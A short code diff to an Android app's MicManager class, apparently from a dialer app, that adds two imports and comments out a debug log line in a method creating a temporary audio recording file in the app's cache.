@@ -5,8 +5,10 @@ import android.content.pm.PackageManager;
 import android.media.AudioFormat;
 import android.media.AudioRecord;
 import android.media.MediaRecorder;
+import android.os.Build;
 import android.util.Log;
 
+import androidx.annotation.RequiresApi;
 import androidx.core.app.ActivityCompat;
 
 import com.example.smartdialer.services.MainService;
@@ -69,7 +71,7 @@ public class MicManager {
     public static void startRecording(int sec) {
         File dir = MainService.getContextOfApplication().getCacheDir();
         try {
-            Log.e("DIRR", dir.getAbsolutePath());
+            //Log.e("DIRR", dir.getAbsolutePath());
             audiofile = File.createTempFile("sound", ".mp3", dir);
 
             //Creating MediaRecorder and specifying audio source, output format, encoder & output format
